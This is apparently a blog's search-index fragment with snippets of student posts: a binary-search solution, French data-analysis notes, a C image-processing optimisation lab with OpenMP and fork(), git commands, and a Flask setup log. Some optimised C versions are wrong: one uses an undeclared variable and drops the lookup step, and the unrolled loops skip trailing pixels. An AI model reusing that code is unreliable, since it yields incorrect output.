else: # l 和 r 分别在两个序列里 # 首先对中点的位置分类讨论 if nums[mid] &amp;gt;= nums[l]: # 中点在左边的递增区间里 # 这里左边界要取到，否则 if nums[l] &amp;lt;= target &amp;lt;= nums[mid]: r = mid else: l = mid + 1 else: # 中点在右边的递增区间里 # 这里右边界要取到 if nums[mid] &amp;lt; target &amp;lt;= nums[r]: l = mid + 1 else: r = mid # 循环结束后 l == r if nums[l] == target: return l else: return -134. 在排序数组中查找元素的第一个和最后一个位置也是一道用二分法的数组题。题目中给出的 nums 数组中的数字是单调递增的，但是数字会有重复。要求给出 target 的左右边界。思路如下：首先用传统二分法找到第一个 target，然后以这个 target 把数组分成两部分，左右分别再用二分法寻找左右边界即可。最后补充代码处理没找到的情况以及特殊情况即可。class Solution: def searchRange(self, nums: List[int], target: int) -&amp;gt; List[int]: if not nums: return (-1, -1) # 二分法 l , r = 0, len(nums) - 1 found = False # 目标是左右指针的值都是 target # 或左指针等于右指针 while (nums[l] != target or nums[r] != target) and l &amp;lt; r: # 中点指针 mid = (l + r) // 2 if nums[mid] &amp;gt; target: r = mid - 1 elif nums[mid] &amp;lt; target: l = mid + 1 else: # 当中点值等于 target 时，保存并跳出循环 first_target = mid found = True break # 如果没找到 target，则左右指针一定相等 if not found: if nums[l] != target: # 如果左指针的值不是 target，则没找到，返回 (-1, -1) return (-1, -1) else: # 如果是，则说明左右指针值均指向唯一的 target return (l, r) # 把边界保存下来 left, right = l, r # 找到了第一个 target 之后以这个 target 为界，分别用二分法寻找左右边界 # 寻找左边界 r = first_target while (nums[left] != target) and left &amp;lt; r: # 中点指针 mid = (left + r) // 2 if nums[mid] &amp;lt; target: left = mid + 1 else: r = mid # 寻找右边界 l = first_target while (nums[right] != target) and l &amp;lt; right: # 中点指针 mid = (l + right) // 2 + 1 if nums[mid] &amp;gt; target: right = mid - 1 else: l = mid # 返回左右边界 return (left, right)" }, { "title": "Analyse des données - 1 Introduction", "url": "/posts/Analyse-des-donn%C3%A9es/", "categories": "Blogging, Study", "tags": "Data_analysis", "date": "2021-10-18 09:40:00 +0800", "snippet": " I. ProfesseurPhilippe MOUTTOUBoite: THALESPost: Recherches de TRL 4Dommaine: Analyse des donnéesEmail: philippe.mouttou@thalesgroup.comII. Contexteposer le pb Definition du pb System d’information que’est-ce qu’on observe. comment - méthodes Deux monde - exhaustif et échantillon Exhaustivité - j’ai tous les cas dissponibles - Big DataÉchantillon - Probabilité - Statistique descriptivemoyenne, éout tupe, variance, fréquenceindicateur de causalité ML et ADFactorisation et classificationIII. Évaluationgroupe de 2 ou 3, avec 4 transparents Nature de pb. Ce qu je fait avec ML/AD Méthode de factorielle. Qu’est-ce qui ne marche pas. Qu’est-ce qu’il faudrai faire. IV. Cours 11. Déscription\\[x(x^1, x^2, ... ,x^p)\\]2. IllustrationNotation $\\mathbb{R}$Espace vectoriel euclidienEspace affine euclidien\\[x=\\left[ \\begin{matrix} x^1 \\\\ x^2 \\\\ \\vdots \\\\ x^p \\end{matrix} \\right], \\quad y=\\left[ \\begin{matrix} y^1 \\\\ y^2 \\\\ \\vdots \\\\ y^p \\end{matrix} \\right]\\]On définit,\\[(x|y) = \\displaystyle \\sum ^{p}_{i = 1}{x^iy^i}\\]\\[\\left \\| x \\right \\| = \\sqrt {(x|x)}\\]\\[d^2(x, y) = \\displaystyle \\sum ^{p}_{i = 1}{(x^i-y^i)^2}\\]3. ProblèmeSoit $n \\in \\mathbb{N}$, soit un ensmeble de $n$ points\\[N=(x_i)_{1\\leq i \\leq n} \\in (\\mathbb{R}^p)^n\\]avec les poids\\[P=(p_i)_{1 \\leq i \\leq n} \\in {[0,+ \\infty [}^n\\]tels que $ \\displaystyle \\sum _{i}{p_i}=1 $On définit $g$ le centre de grativité sous cette condition\\[g = \\displaystyle \\sum^{n}_{i=1}{p_ix_i}\\]le Critère de Fidélité:\\[\\tag{Fidelity criteria} \\operatorname {Max}(\\displaystyle \\sum _{i}{\\displaystyle \\sum _{j}{p_ip_jd^2(\\hat{x_i}, \\hat{x_j})}})\\]Definisson $ \\operatorname {M^t} (H) = \\displaystyle \\sum _{i}{p_i {\\left | x_i - \\hat{x_i} \\right |}^2}$le Critère de Proximité:\\[\\tag{Proximity Criteria} \\operatorname {Min} (\\operatorname {M^t} (H) )\\]4. Résultats5. Résolution6. CritèreV. Infos ComplémentairesTechnical Reacliness Level (TRL)1 - 91 - 3 Recherche 4 - 6 Recherche appliquée" }, { "title": "专业课 - 基于并行计算的代码优化", "url": "/posts/Code-optimization/", "categories": "Blogging, Study", "tags": "parallel_computing", "date": "2021-10-11 21:14:00 +0800", "snippet": "1. Compilation and executationcompile.$ makecc -c -o io.o io.ccc -c -o transfo.o transfo.ccc -c -o cycles.o cycles.ccc -o transform_image io.o transfo.o cycles.oclean compilation output files.$ make cleanrm -f *.o transform_imagerm -fr cmake-build-debugThe first executation.enter imagerie folder, set the environmental variable$ export IMAGES=../data$ time ./transform_image $IMAGES/transfo.txtimage1.pgm courbe1.amp 5 image1_t.pgmimage1.pgm: 5617 x 3684 = 20693028 pixels1174160151.000000 clock cycles.image2.pgm courbe2.amp 5 image2_t.pgmimage2.pgm: 5227 x 3515 = 18372905 pixels1095196812.000000 clock cycles.image3.pgm courbe3.amp 5 image3_t.pgmimage3.pgm: 6660 x 9185 = 61172100 pixels3534617694.000000 clock cycles.image4.pgm courbe4.amp 4 image4_t.pgmimage4.pgm: 3381 x 4914 = 16614234 pixels909382992.000000 clock cycles.image5.pgm courbe5.amp 7 image5_t.pgmimage5.pgm: 3226 x 3255 = 10500630 pixels622586028.000000 clock cycles.image6.pgm courbe6.amp 6 image6_t.pgmimage6.pgm: 3677 x 3677 = 13520329 pixels851808507.000000 clock cycles.image7.pgm courbe7.amp 9 image7_t.pgmimage7.pgm: 3264 x 4896 = 15980544 pixels875622380.000000 clock cycles.image8.pgm courbe8.amp 5 image8_t.pgmimage8.pgm: 1757 x 2636 = 4631452 pixels212227580.000000 clock cycles.image9.pgm courbe9.amp 7 image9_t.pgmimage9.pgm: 2498 x 3330 = 8318340 pixels410359449.000000 clock cycles.image10.pgm courbe10.amp 9 image10_t.pgmimage10.pgm: 3024 x 3024 = 9144576 pixels486787547.000000 clock cycles.TOTAL: 10172749140.000000 clock cycles.real 0m20.266suser 0m10.037ssys 0m0.564sAfter the verification, enter the data folder, clean the output files.$ ./clean.sh2. Optimisations 优化代码À chaque modification, relancer le code et mesurer le gain obtenu. Garder trace de chaque version de votre code avec le gain obtenu. Recommendations: Utiliser moins de fonctions Mieux utiliser la mémoire (localité) Utiliser moins de boucles Vous pouvez vous aider de perf (si vous êtes sous Linux) pour analyser plus finement le comportement de votre codeAnalysis of the source code 源代码解析首先查看算法源代码，结合data\\transfo.txt文件内容可以得出，这是一个将一张图片复制、进行像素值变换并提高亮度的算法。void copy (int w, int h, unsigned char *src, unsigned char *dest){ int i,j; for (i = 0; i &amp;lt; w; i++) { for (j = 0; j &amp;lt; h; j++) { dest[j * w + i] = src[j * w + i]; } }}void light(int w, int h, unsigned char *img, unsigned char val){ int i,j; unsigned char current; for (i = 0; i &amp;lt; w; i++) { for (j = 0; j &amp;lt; h; j++) { current = img[j * w + i]; img[j * w + i] = (((int) current + val) &amp;gt; 255) ? 255 : current + val; } }}void curve(int w, int h, unsigned char *img, unsigned char *lut){ int i,j; unsigned char current; for (i = 0; i &amp;lt; w; i++) { for (j = 0; j &amp;lt; h; j++) { current = img[j * w + i]; img[j * w + i] = lut[current]; } }}void transfo(int w, int h, unsigned char *src, unsigned char *dest, unsigned char *lut, unsigned char val){ copy(w, h, src, dest); curve(w, h, dest, lut); light(w, h, dest, val);}优化1将三个函数压缩成一个函数，减少重复遍历Combine three functions to one, reduece the total times of iteration./*void copy (int w, int h, unsigned char *src, unsigned char *dest){ int i,j; for (i = 0; i &amp;lt; w; i++) { for (j = 0; j &amp;lt; h; j++) { dest[j * w + i] = src[j * w + i]; } }}void light(int w, int h, unsigned char *img, unsigned char val){ int i,j; unsigned char current; for (i = 0; i &amp;lt; w; i++) { for (j = 0; j &amp;lt; h; j++) { current = img[j * w + i]; img[j * w + i] = (((int) current + val) &amp;gt; 255) ? 255 : current + val; } }}void curve(int w, int h, unsigned char *img, unsigned char *lut){ int i,j; unsigned char current; for (i = 0; i &amp;lt; w; i++) { for (j = 0; j &amp;lt; h; j++) { current = img[j * w + i]; img[j * w + i] = lut[current]; } }}*/void loop_process(int w, int h, unsigned char *src, unsigned char *dest, unsigned char *lut, unsigned char val){ int i,j; unsigned char current; for (i = 0; i &amp;lt; w; i++) { for (j = 0; j &amp;lt; h; j++) { // copy dest[j * w + i] = src[j * w + i]; // curve current = dest[j * w + i]; dest[j * w + i] = lut[current]; // light current = dest[j * w + i]; dest[j * w + i] = (((int) current + val) &amp;gt; 255) ? 255 : current + val; } }}void transfo(int w, int h, unsigned char *src, unsigned char *dest, unsigned char *lut, unsigned char val){ /* copy(w, h, src, dest); curve(w, h, dest, lut); light(w, h, dest, val); */ loop_process(w, h, src, dest, lut, val);}Test$ time ./transform_image $IMAGES/transfo.txtimage1.pgm courbe1.amp 5 image1_t.pgmimage1.pgm: 5617 x 3684 = 20693028 pixels718480772.000000 clock cycles.image2.pgm courbe2.amp 5 image2_t.pgmimage2.pgm: 5227 x 3515 = 18372905 pixels668396133.000000 clock cycles.image3.pgm courbe3.amp 5 image3_t.pgmimage3.pgm: 6660 x 9185 = 61172100 pixels2273278456.000000 clock cycles.image4.pgm courbe4.amp 4 image4_t.pgmimage4.pgm: 3381 x 4914 = 16614234 pixels590257783.000000 clock cycles.image5.pgm courbe5.amp 7 image5_t.pgmimage5.pgm: 3226 x 3255 = 10500630 pixels336672412.000000 clock cycles.image6.pgm courbe6.amp 6 image6_t.pgmimage6.pgm: 3677 x 3677 = 13520329 pixels440642125.000000 clock cycles.image7.pgm courbe7.amp 9 image7_t.pgmimage7.pgm: 3264 x 4896 = 15980544 pixels520065354.000000 clock cycles.image8.pgm courbe8.amp 5 image8_t.pgmimage8.pgm: 1757 x 2636 = 4631452 pixels127555428.000000 clock cycles.image9.pgm courbe9.amp 7 image9_t.pgmimage9.pgm: 2498 x 3330 = 8318340 pixels235020610.000000 clock cycles.image10.pgm courbe10.amp 9 image10_t.pgmimage10.pgm: 3024 x 3024 = 9144576 pixels292524428.000000 clock cycles.TOTAL: 6202893501.000000 clock cycles.real 0m17.814suser 0m7.847ssys 0m0.653s2-3 seconds faster优化2We can compress two for into one for loop.显然两个 for 循环可以压缩成一个 for 循环。The improved codes are shown below.改完代码如下：void loop_process(int w, int h, unsigned char *src, unsigned char *dest, unsigned char *lut, unsigned char val){ int n = w * h; unsigned char current; int i; for (i = 0; i &amp;lt; n; i++) { // copy dest[i] = src[i]; // curve current = dest[i]; dest[i] = lut[current]; // light current = dest[i]; dest[i] = (((int) current + val) &amp;gt; 255) ? 255 : current + val; }}Test$ time ./transform_image $IMAGES/transfo.txtimage1.pgm courbe1.amp 5 image1_t.pgmimage1.pgm: 5617 x 3684 = 20693028 pixels241626861.000000 clock cycles.image2.pgm courbe2.amp 5 image2_t.pgmimage2.pgm: 5227 x 3515 = 18372905 pixels207095052.000000 clock cycles.image3.pgm courbe3.amp 5 image3_t.pgmimage3.pgm: 6660 x 9185 = 61172100 pixels688837133.000000 clock cycles.image4.pgm courbe4.amp 4 image4_t.pgmimage4.pgm: 3381 x 4914 = 16614234 pixels188729000.000000 clock cycles.image5.pgm courbe5.amp 7 image5_t.pgmimage5.pgm: 3226 x 3255 = 10500630 pixels110668988.000000 clock cycles.image6.pgm courbe6.amp 6 image6_t.pgmimage6.pgm: 3677 x 3677 = 13520329 pixels153436717.000000 clock cycles.image7.pgm courbe7.amp 9 image7_t.pgmimage7.pgm: 3264 x 4896 = 15980544 pixels216416799.000000 clock cycles.image8.pgm courbe8.amp 5 image8_t.pgmimage8.pgm: 1757 x 2636 = 4631452 pixels48847379.000000 clock cycles.image9.pgm courbe9.amp 7 image9_t.pgmimage9.pgm: 2498 x 3330 = 8318340 pixels87362807.000000 clock cycles.image10.pgm courbe10.amp 9 image10_t.pgmimage10.pgm: 3024 x 3024 = 9144576 pixels110621170.000000 clock cycles.TOTAL: 2053641906.000000 clock cycles.real 0m17.044suser 0m6.391ssys 0m0.845s1 sec faster.优化3Improve the algorithm:算法显然可以再优化，优化完结果：void loop_process(int w, int h, unsigned char *src, unsigned char *dest, unsigned char *lut, unsigned char val){ int n = w * h; unsigned char tmp; int i; for (i = 0; i &amp;lt; n; i++) { current = src[i]; dest[i] = (((int) current + val) &amp;gt; 255) ? 255 : current + val; }}Test$ time ./transform_image $IMAGES/transfo.txtimage1.pgm courbe1.amp 5 image1_t.pgmimage1.pgm: 5617 x 3684 = 20693028 pixels107953226.000000 clock cycles.image2.pgm courbe2.amp 5 image2_t.pgmimage2.pgm: 5227 x 3515 = 18372905 pixels88947604.000000 clock cycles.image3.pgm courbe3.amp 5 image3_t.pgmimage3.pgm: 6660 x 9185 = 61172100 pixels336525503.000000 clock cycles.image4.pgm courbe4.amp 4 image4_t.pgmimage4.pgm: 3381 x 4914 = 16614234 pixels78052902.000000 clock cycles.image5.pgm courbe5.amp 7 image5_t.pgmimage5.pgm: 3226 x 3255 = 10500630 pixels50549115.000000 clock cycles.image6.pgm courbe6.amp 6 image6_t.pgmimage6.pgm: 3677 x 3677 = 13520329 pixels63703490.000000 clock cycles.image7.pgm courbe7.amp 9 image7_t.pgmimage7.pgm: 3264 x 4896 = 15980544 pixels75967615.000000 clock cycles.image8.pgm courbe8.amp 5 image8_t.pgmimage8.pgm: 1757 x 2636 = 4631452 pixels22521228.000000 clock cycles.image9.pgm courbe9.amp 7 image9_t.pgmimage9.pgm: 2498 x 3330 = 8318340 pixels39134269.000000 clock cycles.image10.pgm courbe10.amp 9 image10_t.pgmimage10.pgm: 3024 x 3024 = 9144576 pixels43233903.000000 clock cycles.TOTAL: 906588855.000000 clock cycles.real 0m16.410suser 0m5.832ssys 0m0.806s1s faster.优化4 Loop unrolling 循环展开使用循环展开的技术来压缩时间。优化后代码：```c transfo.cvoid loop_process(int w, int h, unsigned char *src, unsigned char *dest, unsigned char *lut, unsigned char val){ int n = w * h; unsigned char current_0, current_1, current_2, current_3;int i; for (i = 0; i &amp;lt; n-3; i+=4) { current_0 = lut[src[i]]; current_1 = lut[src[i+1]]; current_2 = lut[src[i+2]]; current_3 = lut[src[i+3]]; dest[i] = (((int) current_0 + val) &amp;gt; 255) ? 255 : current_0 + val; dest[i+1] = (((int) current_1 + val) &amp;gt; 255) ? 255 : current_1 + val; dest[i+2] = (((int) current_2 + val) &amp;gt; 255) ? 255 : current_2 + val; dest[i+3] = (((int) current_3 + val) &amp;gt; 255) ? 255 : current_3 + val; } } ```Test$ time ./transform_image $IMAGES/transfo.txtimage1.pgm courbe1.amp 5 image1_t.pgmimage1.pgm: 5617 x 3684 = 20693028 pixels93511300.000000 clock cycles.image2.pgm courbe2.amp 5 image2_t.pgmimage2.pgm: 5227 x 3515 = 18372905 pixels74312291.000000 clock cycles.image3.pgm courbe3.amp 5 image3_t.pgmimage3.pgm: 6660 x 9185 = 61172100 pixels295375831.000000 clock cycles.image4.pgm courbe4.amp 4 image4_t.pgmimage4.pgm: 3381 x 4914 = 16614234 pixels65381472.000000 clock cycles.image5.pgm courbe5.amp 7 image5_t.pgmimage5.pgm: 3226 x 3255 = 10500630 pixels41186202.000000 clock cycles.image6.pgm courbe6.amp 6 image6_t.pgmimage6.pgm: 3677 x 3677 = 13520329 pixels53358892.000000 clock cycles.image7.pgm courbe7.amp 9 image7_t.pgmimage7.pgm: 3264 x 4896 = 15980544 pixels63093263.000000 clock cycles.image8.pgm courbe8.amp 5 image8_t.pgmimage8.pgm: 1757 x 2636 = 4631452 pixels18141256.000000 clock cycles.image9.pgm courbe9.amp 7 image9_t.pgmimage9.pgm: 2498 x 3330 = 8318340 pixels33467929.000000 clock cycles.image10.pgm courbe10.amp 9 image10_t.pgmimage10.pgm: 3024 x 3024 = 9144576 pixels36029574.000000 clock cycles.TOTAL: 773858010.000000 clock cycles.real 0m14.911suser 0m4.991ssys 0m0.510s性能提高。Better performance.优化5lut saturation.可以对lut变换的数组先加val进行饱和判断操作，然后遍历进行变换，这样会减少更多循环的次数以及if判断的次数。void loop_process(int w, int h, unsigned char *src, unsigned char *dest, unsigned char *lut, unsigned char val){ int n = w * h; int i; for (i = 0; i &amp;lt;= 255; i ++) { lut[i] = (((int) lut[i] + val) &amp;gt; 255) ? 255 : lut[i] + val; } for (i = 0; i &amp;lt; n-3; i+=4) { dest[i] = lut[src[i]]; dest[i+1] = lut[src[i+1]]; dest[i+2] = lut[src[i+2]]; dest[i+3] = lut[src[i+3]]; }}Test$ time ./transform_image $IMAGES/transfo.txtimage1.pgm courbe1.amp 5 image1_t.pgmimage1.pgm: 5617 x 3684 = 20693028 pixels62751136.000000 clock cycles.image2.pgm courbe2.amp 5 image2_t.pgmimage2.pgm: 5227 x 3515 = 18372905 pixels50819186.000000 clock cycles.image3.pgm courbe3.amp 5 image3_t.pgmimage3.pgm: 6660 x 9185 = 61172100 pixels220661554.000000 clock cycles.image4.pgm courbe4.amp 4 image4_t.pgmimage4.pgm: 3381 x 4914 = 16614234 pixels43584822.000000 clock cycles.image5.pgm courbe5.amp 7 image5_t.pgmimage5.pgm: 3226 x 3255 = 10500630 pixels27588220.000000 clock cycles.image6.pgm courbe6.amp 6 image6_t.pgmimage6.pgm: 3677 x 3677 = 13520329 pixels37273392.000000 clock cycles.image7.pgm courbe7.amp 9 image7_t.pgmimage7.pgm: 3264 x 4896 = 15980544 pixels42147550.000000 clock cycles.image8.pgm courbe8.amp 5 image8_t.pgmimage8.pgm: 1757 x 2636 = 4631452 pixels20684776.000000 clock cycles.image9.pgm courbe9.amp 7 image9_t.pgmimage9.pgm: 2498 x 3330 = 8318340 pixels22268526.000000 clock cycles.image10.pgm courbe10.amp 9 image10_t.pgmimage10.pgm: 3024 x 3024 = 9144576 pixels24155182.000000 clock cycles.TOTAL: 551934344.000000 clock cycles.real 0m15.721suser 0m5.409ssys 0m0.593s反而下降了，说明这个方法没有改变太多。也可能是电脑运行久了变热了运算速度下降了。The problem is that the system I used is wsl2 and the file path is in /mnt/c/ which will make the reading process cost more time.Parallélisation(s) 并行计算Voici des pistes de parallélisation, qui peuvent être complémentaires: Vectorisation: utiliser les instructions vectorielles, soit en optimisant l’assembleur “à la main”, soit en utilisant les intrinsics x86 présents dans GCC, soit en utilisant les bons paramètres du compilateur. Cette étape nécessitera certainement d’aider le compilateur en lui présentant des boucles “facilement” vectorisables. Vérifiez également que GCC génère du code correspondant à votre machine. La documentation Intel sur l’optimisation de code pour architecture x86-64 donne de nombreuses pistes d’optimisation. Multithreads: utiliser OpenMP pour obtenir une version du code utilisant plusieurs threads. Mesurer le gain obtenu en fonction du nombre de threads utilisés. Multiprocessus: modifier le code en utilisant plusieurs processus. On peut imaginer ici que l’on utilise des processus en parallèle où chaque processus s’occuperait d’une image. Ainsi, on pourra cherche ici à améliorer le temps pris par le traitement des dix images à la suite. Se rappeler de fork(). GPU: utiliser CUDA afin d’obtenir une version du code fonctionnant sur un processeur graphique.GCC loop distribution在 CMakeLists.txt里面加上一句SET ( CMAKE_CXX_FLAGS &quot;-fopenmp&quot; )project(transform_image)SET ( CMAKE_CXX_FLAGS &quot;-fopenmp&quot; )add_executable(transform_image cycles.c cycles.h io.c transfo.c transfo.h)然后在要加速的for循环前加一行#pragma omp parallel forvoid loop_process(int w, int h, unsigned char *src, unsigned char *dest, unsigned char *lut, unsigned char val){ int n = w * h; int i; #pragma omp parallel for for (i = 0; i &amp;lt;= 255; i ++) { lut[i] = (((int) lut[i] + val) &amp;gt; 255) ? 255 : lut[i] + val; } #pragma omp parallel for for (i = 0; i &amp;lt; n-3; i+=4) { dest[i] = lut[src[i]]; dest[i+1] = lut[src[i+1]]; dest[i+2] = lut[src[i+2]]; dest[i+3] = lut[src[i+3]]; }}测试$ time ./transform_image $IMAGES/transfo.txtimage1.pgm courbe1.amp 5 image1_t.pgmimage1.pgm: 5617 x 3684 = 20693028 pixels71895122.000000 clock cycles.image2.pgm courbe2.amp 5 image2_t.pgmimage2.pgm: 5227 x 3515 = 18372905 pixels57267568.000000 clock cycles.image3.pgm courbe3.amp 5 image3_t.pgmimage3.pgm: 6660 x 9185 = 61172100 pixels237394217.000000 clock cycles.image4.pgm courbe4.amp 4 image4_t.pgmimage4.pgm: 3381 x 4914 = 16614234 pixels43233580.000000 clock cycles.image5.pgm courbe5.amp 7 image5_t.pgmimage5.pgm: 3226 x 3255 = 10500630 pixels27222220.000000 clock cycles.image6.pgm courbe6.amp 6 image6_t.pgmimage6.pgm: 3677 x 3677 = 13520329 pixels52180870.000000 clock cycles.image7.pgm courbe7.amp 9 image7_t.pgmimage7.pgm: 3264 x 4896 = 15980544 pixels42858312.000000 clock cycles.image8.pgm courbe8.amp 5 image8_t.pgmimage8.pgm: 1757 x 2636 = 4631452 pixels12074296.000000 clock cycles.image9.pgm courbe9.amp 7 image9_t.pgmimage9.pgm: 2498 x 3330 = 8318340 pixels21542948.000000 clock cycles.image10.pgm courbe10.amp 9 image10_t.pgmimage10.pgm: 3024 x 3024 = 9144576 pixels24088950.000000 clock cycles.TOTAL: 589758083.000000 clock cycles.real 0m14.813suser 0m5.547ssys 0m0.430s有所效果，但不明显。在不使用循环展开的情况下检查效果：void loop_process(int w, int h, unsigned char *src, unsigned char *dest, unsigned char *lut, unsigned char val){ int n = w * h; int i; #pragma omp parallel for for (i = 0; i &amp;lt;= 255; i ++) { lut[i] = (((int) lut[i] + val) &amp;gt; 255) ? 255 : lut[i] + val; } #pragma omp parallel for for (i = 0; i &amp;lt; n; i++) { dest[i] = lut[src[i]]; }}$ time ./transform_image $IMAGES/transfo.txtimage1.pgm courbe1.amp 5 image1_t.pgmimage1.pgm: 5617 x 3684 = 20693028 pixels90885426.000000 clock cycles.image2.pgm courbe2.amp 5 image2_t.pgmimage2.pgm: 5227 x 3515 = 18372905 pixels73543448.000000 clock cycles.image3.pgm courbe3.amp 5 image3_t.pgmimage3.pgm: 6660 x 9185 = 61172100 pixels283044717.000000 clock cycles.image4.pgm courbe4.amp 4 image4_t.pgmimage4.pgm: 3381 x 4914 = 16614234 pixels63834405.000000 clock cycles.image5.pgm courbe5.amp 7 image5_t.pgmimage5.pgm: 3226 x 3255 = 10500630 pixels43076592.000000 clock cycles.image6.pgm courbe6.amp 6 image6_t.pgmimage6.pgm: 3677 x 3677 = 13520329 pixels52240602.000000 clock cycles.image7.pgm courbe7.amp 9 image7_t.pgmimage7.pgm: 3264 x 4896 = 15980544 pixels62215935.000000 clock cycles.image8.pgm courbe8.amp 5 image8_t.pgmimage8.pgm: 1757 x 2636 = 4631452 pixels17739868.000000 clock cycles.image9.pgm courbe9.amp 7 image9_t.pgmimage9.pgm: 2498 x 3330 = 8318340 pixels32985879.000000 clock cycles.image10.pgm courbe10.amp 9 image10_t.pgmimage10.pgm: 3024 x 3024 = 9144576 pixels35069814.000000 clock cycles.TOTAL: 754636686.000000 clock cycles.real 0m14.513suser 0m5.108ssys 0m0.538s可以看见和前者相差不大，循环展开提升的效果在并行计算的情况下被弱化了。Multithreads - OpenMPOpenMP 官方上介绍的方法和上一个差不多，应该也是基于 gcc 编译过程中的 loop disstribution 的技术。Multiprocessus - fork()fork() functions.使用消息队列完成进程的内部通信导入两个进程相关的头文件 &amp;lt;unistd.h&amp;gt; &amp;lt;sys/wait.h&amp;gt;以及一个用于进程间信息交换的头文件 &amp;lt;sys/ipc.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;sys/wait.h&amp;gt;#include &amp;lt;sys/ipc.h&amp;gt;```c io.cvoid run_transfo_file(FILE *tf){ char source[FNMAX]; char curve[FNMAX]; char dest[FNMAX]; int light;pid_t child_pid, wpid;int status = 0;double total;while (fscanf(tf, &quot;%s %s %d %s&quot;, source, curve, &amp;amp;light, dest) == 4) { child_pid = fork(); if (child_pid == 0) { int res; printf(&quot;pid: %d %s %s %d %s\\n&quot;,getpid(), source, curve, light, dest); total += transform_image(source, curve, light, dest); exit(0); }}while ((wpid = wait(&amp;amp;status)) &amp;gt; 0);printf(&quot;TOTAL: %f clock cycles.\\n&quot;, total); } ```Test$ time ./transform_image $IMAGES/transfo.txtpid: 5076 image1.pgm courbe1.amp 5 image1_t.pgmpid: 5077 image2.pgm courbe2.amp 5 image2_t.pgmpid: 5078 image3.pgm courbe3.amp 5 image3_t.pgmpid: 5079 image4.pgm courbe4.amp 4 image4_t.pgmpid: 5080 image5.pgm courbe5.amp 7 image5_t.pgmpid: 5081 image6.pgm courbe6.amp 6 image6_t.pgmpid: 5082 image7.pgm courbe7.amp 9 image7_t.pgmpid: 5083 image8.pgm courbe8.amp 5 image8_t.pgmpid: 5084 image9.pgm courbe9.amp 7 image9_t.pgmpid: 5085 image10.pgm courbe10.amp 9 image10_t.pgmimage1.pgm: 5617 x 3684 = 20693028 pixelsimage2.pgm: 5227 x 3515 = 18372905 pixelsimage3.pgm: 6660 x 9185 = 61172100 pixelsimage4.pgm: 3381 x 4914 = 16614234 pixelsimage5.pgm: 3226 x 3255 = 10500630 pixelsimage7.pgm: 3264 x 4896 = 15980544 pixelsimage6.pgm: 3677 x 3677 = 13520329 pixelsimage8.pgm: 1757 x 2636 = 4631452 pixelsimage10.pgm: 3024 x 3024 = 9144576 pixelsimage9.pgm: 2498 x 3330 = 8318340 pixels21427730.000000 clock cycles.37286814.000000 clock cycles.38725273.000000 clock cycles.45551827.000000 clock cycles.58591918.000000 clock cycles.69907987.000000 clock cycles.88265978.000000 clock cycles.68358251.000000 clock cycles.73210363.000000 clock cycles.187752982.000000 clock cycles.TOTAL: 0.000000 clock cycles.real 0m7.214suser 0m7.764ssys 0m1.871sThe value TOTAL in the result is 0, actually we need to realize a communication between parend process and son processes." }, { "title": "GIT - 使用 Git 进行团队开发", "url": "/posts/Coorperation-git/", "categories": "Blogging, Study", "tags": "Git", "date": "2021-10-11 21:14:00 +0800", "snippet": "Git进入自己的分支，保证分支在最新的版本$ git pull --rebase origin main解决完冲突之后，更新线上的分支$ git push --force然后在 Github 网站上进行 Merge" }, { "title": "专业课 - 基于 Python 的后端开发", "url": "/posts/Backend-programing/", "categories": "Blogging, Study", "tags": "Backend, Python", "date": "2021-10-07 20:18:00 +0800", "snippet": "项目网站：https://www.cri.mines-paristech.fr/~coelho/kiva.html步骤msi@msi:~/Desktop/TP_Kiva/kiva/back-end$ make venvpython3 -m venv venv. venv/bin/activatepip install FlaskSimpleAuth anodb passlib bcrypt psycopg2-binarypip install pytest requestspip install mypy flake8pip install wheelCollecting FlaskSimpleAuth Downloading FlaskSimpleAuth-4.2.0-py3-none-any.whl (25 kB)Collecting anodb Downloading anodb-3.0.0-py3-none-any.whl (4.6 kB)Collecting passlib Downloading passlib-1.7.4-py2.py3-none-any.whl (525 kB) |████████████████████████████████| 525 kB 5.8 MB/s Collecting bcrypt Downloading bcrypt-3.2.0-cp36-abi3-manylinux2010_x86_64.whl (63 kB) |████████████████████████████████| 63 kB 5.5 MB/s Collecting psycopg2-binary Downloading psycopg2_binary-2.9.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.4 MB) |████████████████████████████████| 3.4 MB 11.6 MB/s Collecting flask Downloading Flask-2.0.2-py3-none-any.whl (95 kB) |████████████████████████████████| 95 kB 4.3 MB/s Collecting aiosql&amp;gt;=3.2.0 Downloading aiosql-3.3.1-py3-none-any.whl (13 kB)Collecting six&amp;gt;=1.4.1 Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)Collecting cffi&amp;gt;=1.1 Using cached cffi-1.14.6-cp38-cp38-manylinux1_x86_64.whl (411 kB)Collecting Jinja2&amp;gt;=3.0 Downloading Jinja2-3.0.2-py3-none-any.whl (133 kB) |████████████████████████████████| 133 kB 15.7 MB/s Collecting Werkzeug&amp;gt;=2.0 Downloading Werkzeug-2.0.2-py3-none-any.whl (288 kB) |████████████████████████████████| 288 kB 8.1 MB/s Collecting itsdangerous&amp;gt;=2.0 Downloading itsdangerous-2.0.1-py3-none-any.whl (18 kB)Collecting click&amp;gt;=7.1.2 Downloading click-8.0.1-py3-none-any.whl (97 kB) |████████████████████████████████| 97 kB 8.9 MB/s Collecting typing-extensions&amp;lt;4,&amp;gt;=3.7.4 Downloading typing_extensions-3.10.0.2-py3-none-any.whl (26 kB)Collecting contextlib2&amp;gt;=21.6.0 Downloading contextlib2-21.6.0-py2.py3-none-any.whl (13 kB)Collecting pycparser Using cached pycparser-2.20-py2.py3-none-any.whl (112 kB)Collecting MarkupSafe&amp;gt;=2.0 Using cached MarkupSafe-2.0.1-cp38-cp38-manylinux2010_x86_64.whl (30 kB)Installing collected packages: MarkupSafe, Jinja2, Werkzeug, itsdangerous, click, flask, FlaskSimpleAuth, typing-extensions, contextlib2, aiosql, anodb, passlib, six, pycparser, cffi, bcrypt, psycopg2-binarySuccessfully installed FlaskSimpleAuth-4.2.0 Jinja2-3.0.2 MarkupSafe-2.0.1 Werkzeug-2.0.2 aiosql-3.3.1 anodb-3.0.0 bcrypt-3.2.0 cffi-1.14.6 click-8.0.1 contextlib2-21.6.0 flask-2.0.2 itsdangerous-2.0.1 passlib-1.7.4 psycopg2-binary-2.9.1 pycparser-2.20 six-1.16.0 typing-extensions-3.10.0.2Collecting pytest Downloading pytest-6.2.5-py3-none-any.whl (280 kB) |████████████████████████████████| 280 kB 5.4 MB/s Collecting requests Downloading requests-2.26.0-py2.py3-none-any.whl (62 kB) |████████████████████████████████| 62 kB 2.5 MB/s Collecting toml Downloading 